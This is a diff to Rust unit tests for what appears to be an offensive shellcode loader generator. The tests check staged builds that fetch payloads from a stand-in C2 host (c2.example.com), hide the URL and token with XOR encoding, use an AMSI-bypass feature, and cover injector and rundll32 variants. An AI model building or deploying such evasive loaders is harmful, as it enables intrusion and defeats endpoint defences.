@@ -112,10 +112,9 @@ fn test_binary_key_is_masked() {
         "plain key bytes must not appear consecutively in source");
 }
 
-#[test]
-fn test_binary_staged_mode_uses_fetch() {
-    let config = LoaderConfig {
-        loader_type: LoaderType::Binary,
+fn rust_pe_staged_config(t: LoaderType) -> LoaderConfig {
+    LoaderConfig {
+        loader_type: t,
         features: vec![Feature::AmsiHwbp],
         encryption: Encryption::Aes256,
         shellcode_hex: "00".into(),
@@ -130,18 +129,65 @@ fn test_binary_staged_mode_uses_fetch() {
             jwt:        "AAA.BBB.CCC".into(),
             user_agent: "Mozilla/5.0".into(),
         }),
+    }
+}
+
+fn assert_pe_staged_source(label: &str, src: &str) {
+    assert!(src.contains("scaffold::stager::fetch"),
+        "{} staged must call scaffold::stager::fetch", label);
+    assert!(!src.contains("https://c2.example.com"),
+        "{} staged URL must be XOR-encoded, not plaintext", label);
+    assert!(!src.contains("AAA.BBB.CCC"),
+        "{} staged JWT must be XOR-encoded, not plaintext", label);
+    assert!(!src.contains("decrypt_aes256") && !src.contains("decrypt_chacha20"),
+        "{} staged mode must skip embedded shellcode decryption path", label);
+}
+
+#[test]
+fn test_binary_staged_mode_uses_fetch() {
+    let src = generate_loader_source(&rust_pe_staged_config(LoaderType::Binary)).unwrap();
+    assert_pe_staged_source("Binary", &src);
+}
+
+#[test]
+fn test_dll_staged_mode_uses_fetch() {
+    let src = generate_loader_source(&rust_pe_staged_config(LoaderType::Dll)).unwrap();
+    assert_pe_staged_source("Dll", &src);
+}
+
+#[test]
+fn test_rundll32_staged_mode_uses_fetch() {
+    let src = generate_loader_source(&rust_pe_staged_config(LoaderType::Rundll32)).unwrap();
+    assert_pe_staged_source("Rundll32", &src);
+}
+
+#[test]
+fn test_injector_staged_mode_uses_fetch() {
+    let src = generate_loader_source(&rust_pe_staged_config(LoaderType::Injector)).unwrap();
+    assert_pe_staged_source("Injector", &src);
+}
+
+#[test]
+fn test_stageless_still_embeds_shellcode() {
+    // Regression: a Binary build without `staged` must still embed shellcode + key.
+    let config = LoaderConfig {
+        loader_type: LoaderType::Binary,
+        features: vec![],
+        encryption: Encryption::Aes256,
+        shellcode_hex: "fc4883e4f0".into(),
+        key_hex: "deadbeef".repeat(8),
+        iv_hex:  "11223344".repeat(4),
+        pe_config: None,
+        appdomain_config: None,
+        wsf_stub_config: None,
+        dotnet_stub_hex: None,
+        staged: None,
     };
     let src = generate_loader_source(&config).unwrap();
-    assert!(src.contains("scaffold::stager::fetch"),
-        "staged Rust binary must call scaffold::stager::fetch");
-    // The plaintext URL/JWT must NOT appear in the source
-    assert!(!src.contains("https://c2.example.com"),
-        "staged URL must be XOR-encoded, not plaintext");
-    assert!(!src.contains("AAA.BBB.CCC"),
-        "staged JWT must be XOR-encoded, not plaintext");
-    // The legacy shellcode literal must NOT appear in staged mode
-    assert!(!src.contains("decrypt_aes256"),
-        "staged mode must skip embedded shellcode decryption path");
+    assert!(src.contains("decrypt_aes256"),
+        "stageless mode must use embedded decrypt path");
+    assert!(!src.contains("scaffold::stager::fetch"),
+        "stageless mode must not call the stager");
 }
 
 #[test]
